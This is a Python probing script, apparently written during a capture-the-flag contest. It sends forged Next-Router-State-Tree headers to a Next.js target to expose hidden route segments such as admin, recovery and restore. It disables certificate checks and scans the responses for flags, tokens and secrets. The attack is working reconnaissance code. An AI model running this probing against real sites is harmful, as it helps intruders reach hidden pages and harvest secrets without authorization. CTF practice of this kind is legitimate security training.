#!/usr/bin/env python3
"""
probe39b: dump full RSC bodies for various router-state-tree to find hidden segments.
"""
import ssl
import urllib.request
import urllib.error
import hashlib
import os

HOST = "funicular-gm2cxozn.alfactf.ru"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

OUT = "/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/funicular/artifacts/p39b"
os.makedirs(OUT, exist_ok=True)

def get(path, headers=None):
    url = f"https://{HOST}{path}"
    rh = {"User-Agent": "p39b"}
    if headers:
        rh.update(headers)
    req = urllib.request.Request(url, headers=rh, method="GET")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        try:
            data = e.read()
        except Exception:
            data = b""
        return e.code, dict(e.headers), data


# baseline: just GET / RSC
print("# baseline RSC=1")
st, h, body = get("/", {"RSC": "1"})
print(f"  st={st} len={len(body)} sha={hashlib.sha256(body).hexdigest()[:16]}")
with open(f"{OUT}/baseline.bin", "wb") as f:
    f.write(body)

TREES = {
    "page": '["",{"children":["__PAGE__",{}]}]',
    "admin": '["",{"children":["admin",{}]}]',
    "recovery": '["",{"children":["recovery",{}]}]',
    "restore": '["",{"children":["restore",{}]}]',
    "operator_restore": '["",{"children":["operator",{"children":["restore",{}]}]}]',
    "modal_restore": '["",{"children":["@modal",{"children":["restore",{}]}]}]',
    "restore_top": '["restore",{"children":["__PAGE__",{}]}]',
    "recovery_top": '["recovery",{"children":["__PAGE__",{}]}]',
    "admin_top": '["admin",{"children":["__PAGE__",{}]}]',
    "auth_top": '["auth",{"children":["__PAGE__",{}]}]',
    "service_top": '["service",{"children":["__PAGE__",{}]}]',
}

for name, tree in TREES.items():
    st, h, body = get("/", {"RSC": "1", "Next-Router-State-Tree": tree})
    sha = hashlib.sha256(body).hexdigest()[:16]
    print(f"\n# {name}: st={st} len={len(body)} sha={sha}")
    print(f"  body[:200]: {body[:200]!r}")
    fn = f"{OUT}/{name}.bin"
    with open(fn, "wb") as f:
        f.write(body)
    if b"recovery" in body or b"restore" in body or b"alfa{" in body or b"flag" in body:
        # Show interesting fragments
        for kw in [b"recovery", b"restore", b"alfa{", b"flag", b"token", b"secret"]:
            idx = body.find(kw)
            if idx >= 0:
                start = max(0, idx-50)
                end = min(len(body), idx+200)
                print(f"  contains {kw!r} at {idx}: {body[start:end]!r}")
    # parse rsc rows
    text = body.decode("utf-8", "replace")
    for line in text.splitlines():
        if line.startswith("0:") or line.startswith("1:") or line.startswith("2:"):
            print(f"  ROW {line[:200]}")
